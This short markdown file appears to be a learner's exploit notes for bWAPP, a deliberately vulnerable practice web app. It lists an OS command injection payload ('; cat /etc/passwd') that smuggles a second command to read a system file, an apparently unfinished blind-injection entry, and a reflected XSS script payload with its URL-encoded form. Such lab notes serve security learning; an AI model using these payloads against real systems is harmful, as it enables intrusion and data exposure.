# bWAPP - Exploits

### (1) OS Command Injection (low)
```bash
; cat /etc/passwd
```

### (2) OS Command Injection-Blind (low)
```bash
$
```

### (3) Cross-Site Scripting - Reflected (GET) (low)
```JS
<script>alert("XSS")</script>
// ?firstname=Hacker&lastname=<script>alert%28"XSS"%29<%2Fscript>&form=submit
```
